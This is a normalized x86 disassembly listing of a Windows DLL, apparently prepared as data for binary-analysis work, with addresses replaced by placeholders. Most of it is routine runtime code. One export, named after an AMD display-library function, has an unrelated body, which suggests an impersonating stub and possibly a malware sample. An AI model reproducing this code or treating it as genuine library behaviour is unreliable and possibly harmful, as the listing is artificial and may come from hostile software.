push [ eax + 0x4 ]
push 0xffffffff
push rw-data
push ebx
push [ ebp - 0x34 ]
call edi
test eax eax
je r-xdata
mov edi [ ebp - 0x1c ]
call sub_10053d80
mov [ eax ] edi
mov edi [ ebp - 0x24 ]
call sub_10050b83
mov [ eax ] edi
mov edi [ ebp - 0x28 ]
call sub_100595ca
mov [ eax ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1007ec69
cmp [ ebp - 0x2c ] ebx
jne r-xdata
push eax
call sub_10022b5a
pop ecx
cmp [ ebp - 0x38 ] ebx
je r-xdata
inc esi
push esi
call sub_1000eda6
pop ecx
imul eax eax 0x3c
add [ ebp - 0x1c ] eax
jmp r-xdata
movsx eax [ esi ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
neg [ ebp - 0x1c ]
mov al [ esi ]
cmp al 0x30
jge r-xdata
mov eax [ edi + 0x4 ]
mov [ eax ] bl
push 0x3
push esi
push 0x40
push [ edi + 0x4 ]
call sub_100317fa
add esp 0x10
test eax eax
je r-xdata
cmp al 0x39
jg r-xdata
cmp [ esi ] 0x3a
jne r-xdata
mov esi [ ebp - 0x1c ]
call sub_10053d80
mov [ eax ] esi
mov esi [ ebp - 0x24 ]
call sub_10050b83
mov [ eax ] esi
jmp r-xdata
inc esi
inc esi
push esi
call sub_1000eda6
pop ecx
add [ ebp - 0x1c ] eax
jmp r-xdata
mov al [ esi ]
cmp al 0x30
jge r-xdata
cmp al 0x39
jg r-xdata
inc esi
sub_1007ed00
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_10058f99
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
add esi 0x4
mov eax [ esi ]
mov al [ edi + eax ]
cmp al 0x3d
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop esi
pop ebp
retn
sub_1007ed52
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
mov ecx edi
test edi edi
je r-xdata
pop edi
leave
retn
cmp [ edi ] eax
je r-xdata
push esi
inc eax
push 0x4
push eax
call sub_1000977c
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
jne r-xdata
add ecx 0x4
inc eax
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
push 0x9
call sub_1006818d
and [ esi ] 0x0
mov eax [ ebp - 0x4 ]
pop esi
sub edi esi
push eax
call sub_100106eb
mov [ esi ] eax
add esi 0x4
mov eax [ edi + esi ]
pop ecx
test eax eax
jne r-xdata
sub_10083b30
push ebp
mov ebp esp
push 0xffffffff
push sub_10083aec
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
push esi
push r--data
mov ecx rw-data
call sub_100531b0
mov [ ebp - 0x4 ] esi
push esi
xor eax eax
mov edi 0x7
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
mov [ rw-data ] ax
call sub_100531b0
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
push esi
mov [ rw-data ] cx
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
call sub_100531b0
mov [ ebp - 0x4 ] 0x2
push esi
xor edx edx
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
mov [ rw-data ] dx
call sub_100531b0
mov [ ebp - 0x4 ] 0x3
push esi
xor eax eax
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
mov [ rw-data ] ax
call sub_100531b0
mov [ ebp - 0x4 ] 0x4
xor ecx ecx
push esi
mov [ rw-data ] cx
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
call sub_100531b0
mov [ ebp - 0x4 ] 0x5
push esi
xor edx edx
push r--data
mov ecx rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
mov [ rw-data ] dx
call sub_100531b0
push 0x206
xor eax eax
push esi
push rw-data
mov [ rw-data ] ax
call sub_10079a10
push 0x3cf0
push esi
push rw-data
mov [ rw-data ] esi
mov [ rw-data ] esi
call sub_10079a10
push 0x3cf0
push esi
push rw-data
call sub_10079a10
push 0x3c
push esi
push rw-data
call sub_10079a10
push 0x78
push esi
push rw-data
call sub_10079a10
push 0x78
push esi
push rw-data
call sub_10079a10
add esp 0x48
push 0x3cf0
push esi
push rw-data
call sub_10079a10
push 0x3cf0
push esi
push rw-data
call sub_10079a10
xor eax eax
push 0x208
push esi
push rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] ax
call sub_10079a10
push 0x208
push esi
push rw-data
call sub_10079a10
push 0x208
push esi
push rw-data
call sub_10079a10
push 0x208
push esi
push rw-data
call sub_10079a10
add esp 0x48
push 0x208
xor eax eax
push esi
push rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_10079a10
push 0x208
push esi
push rw-data
call sub_10079a10
push 0x208
push esi
push rw-data
call sub_10079a10
push 0x208
push esi
push rw-data
call sub_10079a10
push 0x1450
push esi
push rw-data
call sub_10079a10
push 0x1450
push esi
push rw-data
call sub_10079a10
add esp 0x48
push 0x1450
push esi
push rw-data
call sub_10079a10
push 0x1450
push esi
push rw-data
call sub_10079a10
push 0x208
push esi
push rw-data
mov [ rw-data ] esi
call sub_10079a10
push 0x208
push esi
push rw-data
call sub_10079a10
push 0x208
push esi
push rw-data
call sub_10079a10
push 0x208
xor eax eax
push esi
push rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_10079a10
add esp 0x48
push j_sub_10041c10
mov [ rw-data ] esi
mov [ rw-data ] esi
call sub_100662c2
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10083ef0
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_10055606
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10008757
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_1000bd19
int3
mov [ rw-data ] eax
mov [ eax ] eax
mov eax [ rw-data ]
mov [ eax + 0x4 ] eax
mov eax [ rw-data ]
mov [ eax + 0x8 ] eax
mov ecx [ rw-data ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ rw-data ]
push sub_10084350
mov [ edx + 0x15 ] al
call sub_100662c2
add esp 0x4
mov esp ebp
pop ebp
retn
sub_10083f70
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_10055606
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10008757
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_1000bd19
int3
mov [ rw-data ] eax
mov [ eax ] eax
mov eax [ rw-data ]
mov [ eax + 0x4 ] eax
mov eax [ rw-data ]
mov [ eax + 0x8 ] eax
mov ecx [ rw-data ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ rw-data ]
push sub_10084230
mov [ edx + 0x15 ] al
call sub_100662c2
add esp 0x4
mov esp ebp
pop ebp
retn
sub_10083ff0
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_10055606
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10008757
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_1000bd19
int3
mov [ rw-data ] eax
mov [ eax ] eax
mov eax [ rw-data ]
mov [ eax + 0x4 ] eax
mov eax [ rw-data ]
mov [ eax + 0x8 ] eax
mov ecx [ rw-data ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ rw-data ]
push sub_10084290
mov [ edx + 0x15 ] al
call sub_100662c2
add esp 0x4
mov esp ebp
pop ebp
retn
sub_10084070
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_10055606
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10008757
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_1000bd19
int3
mov [ rw-data ] eax
mov [ eax ] eax
mov eax [ rw-data ]
mov [ eax + 0x4 ] eax
mov eax [ rw-data ]
mov [ eax + 0x8 ] eax
mov ecx [ rw-data ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ rw-data ]
push sub_100842f0
mov [ edx + 0x15 ] al
call sub_100662c2
add esp 0x4
mov esp ebp
pop ebp
retn
sub_10084230
push ebp
mov ebp esp
push 0xffffffff
push sub_1007efba
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_1002a350
mov ecx [ rw-data ]
push ecx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_10084290
push ebp
mov ebp esp
push 0xffffffff
push sub_1007efea
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_1002a350
mov ecx [ rw-data ]
push ecx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_100842f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f01a
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_1002a350
mov ecx [ rw-data ]
push ecx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_10084350
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f04a
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_1002a350
mov ecx [ rw-data ]
push ecx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_100843b0
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ rw-data ]
push ecx
push rw-data
push edx
push eax
call sub_10011560
mov eax [ rw-data ]
push eax
call sub_1006591f
add esp 0x14
sub_1000149a
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1003c66c
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10001650
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x18 ]
call sub_10022ef0
pop edi
pop ebp
retn
sub_10001662
mov al [ ecx + 0xc ]
retn
sub_10002952
push 0xd
call sub_100106d4
pop ecx
retn
sub_1000295b
push 0xc
call sub_100106d4
pop ecx
retn
sub_100029ad
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_10002b2e
push 0xd
call sub_100106d4
pop ecx
retn
sub_10002b3a
push 0xc
call sub_100106d4
pop ecx
retn
sub_10002e10
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push 0xa
push edx
call sub_1001737a
add esp 0x10
pop ebp
retn
sub_10003200
mov eax rw-data
retn
sub_10003288
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_100041b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
add ecx 0x8
push ecx
push 0x5
push eax
call sub_100268a0
add esp 0xc
pop ebp
retn
sub_10004888
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_10004989
push ebx
call sub_100617e7
pop ecx
retn
sub_100051cc
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1003b946
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10005296
mov [ ecx ] r--data
jmp sub_1005bb5a
sub_10007a22
push ebx
call sub_100617e7
pop ecx
retn
sub_10007cfe
call sub_10039c8c
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
add eax 0xc
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_1004beba
sub_10008150
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
push 0x1
call edx
sub_10009040
mov eax 0x80004001
retn 0x8
sub_100096d0
mov eax [ ecx - 0x10 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x10 ] r--data
retn
sub_1000a65e
mov edi edi
push ebp
mov ebp esp
push ecx
fnstsw [ ebp - 0x4 ]
fnclex
movsx eax [ ebp - 0x4 ]
leave
retn
sub_1000a770
mov eax ecx
cmp [ eax + 0x14 ] 0x10
jb r-xdata
retn
mov eax [ eax ]
sub_1000aa40
push 0x2
call sub_1006818d
sub_1000e090
add ecx 0x4
jmp sub_1001580e
sub_1000ea80
mov eax [ eax ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_100106d4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_10010cbf
mov eax [ ebp - 0x14 ]
push eax
call sub_1006591f
add esp 0x4
push 0x0
push 0x0
call sub_1000bd19
int3
sub_1001160e
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_10011617
mov esp [ ebp - 0x18 ]
call sub_10059574
sub_100135a9
int3
sub_100137e3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
cmp [ ebp + 0x14 ] eax
jae r-xdata
pop ebp
retn 0x10
mov eax [ ebp + 0x14 ]
sub_10014510
push ecx
call [ VariantClear@IAT ]
retn
sub_10015293
push 0xa
call sub_100106d4
pop ecx
retn
sub_10015351
push 0xb
call sub_100106d4
pop ecx
retn
sub_100154a3
mov ecx [ ebp - 0x14 ]
call sub_1003be34
xor ebx ebx
push ebx
push ebx
call sub_1000bd19
int3
sub_100156b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_1003c66c
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1001580e
push [ ecx ]
call sub_10039bcb
pop ecx
retn
sub_10015a30
push esi
xor esi esi
mov eax 0xcccccccd
mul ecx
shr edx 0x3
mov ecx edx
inc esi
test ecx ecx
jne r-xdata
mov eax esi
pop esi
retn
sub_10015b50
mov eax 0x80004002
retn 0xc
sub_10015db0
mov [ ecx ] r--data
retn
sub_10016cad
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_1007926d
add esp 0xc
pop ebp
retn
sub_1001737a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000469c
add esp 0x14
pop ebp
retn
sub_10017a80
add ecx 0x4
jmp sub_1005c994
sub_10017f6e
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_10022b5a
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_100188fe
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_10018920
mov eax esi
call sub_100542e0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax esi
retn
sub_10019279
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10034295
pop ecx
pop ecx
pop ebp
retn
sub_10019a80
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
pop ebp
jmp sub_100113a0
sub_10019b4e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1001a090
or eax 0xffffffff
retn
sub_1001a767
push 0x1
push 0x0
push 0x0
call sub_1007926d
add esp 0xc
retn
sub_1001b2a0
mov eax 0x5
retn
sub_1001b53a
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10012920
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1001bba1
mov ax [ ecx + 0xc ]
retn
sub_1001bc63
mov edi edi
push ebp
mov ebp esp
call sub_100049c2
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call [ ExitThread@IAT ]
int3
push eax
call sub_10027339
pop ecx
sub_1001c32b
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x0
push 0x0
call sub_1000bd19
int3
mov ecx esi
call sub_10016cd0
push esi
call sub_1006591f
add esp 0x4
sub_1001e501
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10061a99
add esp 0x10
pop ebp
retn 0xc
sub_1001e51f
mov eax rw-data
retn
sub_1001e610
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1001ebb7
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1003c66c
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1001ee5b
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001460
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1001fe41
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_1001ff30
mov eax [ ecx + 0x10 ]
push edi
push r--data
xor edi edi
call sub_10039b60
neg eax
sbb eax eax
neg eax
pop edi
retn
sub_10020278
mov esi [ ebp + 0x8 ]
call sub_10028360
push 0x0
push 0x0
call sub_1000bd19
int3
sub_100202dd
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_100206c0
xor al al
retn
sub_100206c3
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_100213dc
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
pop ebp
retn
j_sub_10005296
jmp sub_10005296
sub_10021460
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_1003c66c
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10021500
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
mov eax [ ecx - 0x8 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x8 ] r--data
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
retn
sub_10021581
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push 0x19
call sub_10017abb
push 0x1
push 0x0
call sub_1002eb77
add esp 0xc
jmp sub_1001b2a6
call eax
sub_10022494
mov eax 0x1
retn
sub_10022818
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_100230d0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x10 ]
call sub_10026580
pop edi
pop ebx
pop ebp
retn
sub_10023e95
push 0x8
call sub_10043f7b
pop ecx
retn
sub_10023ea0
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_10023eaa
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_1002412a
xor eax eax
inc eax
retn
sub_1002412e
mov esp [ ebp - 0x18 ]
call sub_10059574
j_sub_10005940
jmp sub_10005940
sub_10024530
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov ecx [ ecx + 0x30 ]
mov eax [ ecx ]
cdq
retn
sub_10026563
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x0
push 0x0
call sub_1000bd19
int3
call sub_1006bd80
sub_1002665e
mov eax [ ecx + 0x1c ]
retn
sub_10027224
push ebx
call sub_100617e7
pop ecx
retn
sub_10027d92
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10028030
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn 0x10
sub_10028071
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10028100
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x0
pop ebp
retn 0x4
sub_100284c0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x18 ]
push ebx
mov ebx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_10052a20
pop ebx
pop ebp
retn
sub_10029b88
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100594c4
add esp 0xc
pop ebp
retn
sub_1002a3ee
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10053369
add esp 0x14
pop ebp
retn
sub_1002a4f1
mov ax [ ecx + 0xe ]
retn
sub_1002ac20
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
retn
lea esp [ esp ]
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_1002af67
mov al [ ecx + 0xd ]
retn
sub_1002b2a8
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_100106d4
pop ecx
sub_1002bbc4
push 0xd
call sub_100106d4
pop ecx
retn
sub_1002bd50
mov eax ecx
retn 0xc
sub_1002be87
push 0xc
call sub_100106d4
pop ecx
retn
sub_1002be93
push 0xc
call sub_100106d4
pop ecx
retn
sub_1002bec4
and [ esi + 0x70 ] 0xffffffef
retn
sub_1002c0fd
mov ecx [ ecx + 0x4 ]
call sub_1005aab0
test eax eax
je r-xdata
retn
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_1002c330
push 0x0
call [ ExitProcess@IAT ]
int3
sub_1002c5c4
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ rw-data ]
call [ TlsGetValue@IAT ]
call eax
pop ebp
retn 0x4
sub_1002c5de
mov eax [ ecx + 0x10 ]
retn
sub_1002c5e2
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1000eda6
sub_1002cad7
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_100549c8
add esp 0xc
pop ebp
retn
sub_1002cd05
push 0x6
call sub_100106d4
pop ecx
retn
sub_1002ead0
push ebp
mov ebp esp
pop ebp
jmp sub_10022b5a
sub_1002ebf8
push 0x0
call sub_10041e05
pop ecx
retn
sub_1002eccd
push ebx
call sub_100617e7
pop ecx
retn
sub_1002ed30
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_1002f2e0
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1007a56b
add esp 0x10
pop ebp
retn
sub_1002f7a0
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
retn
push eax
call sub_1006591f
add esp 0x4
sub_1002fea0
push ebp
mov ebp esp
push ecx
mov ecx [ rw-data ]
add ecx 0x1c
push esi
mov [ ebp - 0x4 ] 0x0
call sub_100201c0
mov eax esi
mov esp ebp
pop ebp
retn
sub_1002ffe0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_100168b0
pop ebp
retn
sub_10030573
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_1000bd19
int3
push eax
call sub_1006591f
add esp 0x4
ADL2_Display_ReGammaCoefficients_Get
push 0x0
call [ GetModuleHandleW@IAT ]
movzx eax [ eax + 0x1 ]
cdq
mov ecx 0x5a
idiv ecx
lea eax [ edx + edx + 0x2 ]
retn
sub_10030989
call sub_10050f67
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_10022b5a
pop ecx
retn
call sub_10042e88
sub_100309a9
push 0x0
call sub_100699f2
pop ecx
retn
sub_10030a8d
push 0xd
call sub_100106d4
pop ecx
retn
sub_10030c32
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004a419
add esp 0xc
pop ebp
retn
sub_10031a30
push edi
mov edi [ rw-data ]
xor eax eax
mov [ edi + 0x104 ] eax
mov [ edi + 0x10c ] eax
mov [ edi + 0x108 ] 0x1
call sub_100010b0
pop edi
retn
sub_10032404
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
push 0x3
mov [ eax ] ecx
pop eax
pop ebp
retn 0x10
sub_10032418
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001893a
add esp 0x10
pop ebp
retn
sub_10032fb0
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_100284d9
add esp 0x8
pop ebp
retn 0x4
sub_1003312e
mov ecx [ ebp - 0x14 ]
push ecx
call sub_1006591f
add esp 0x4
push 0x0
push 0x0
call sub_1000bd19
int3
sub_100338b1
xor eax eax
retn 0x10
sub_100338b6
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10012920
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100339b2
push [ ebp + 0x8 ]
call sub_100617e7
pop ecx
retn
sub_100339bc
xor eax eax
retn 0x14
sub_1003423c
mov edx [ ebp - 0x14 ]
push edx
call sub_1006591f
add esp 0x4
push 0x0
push 0x0
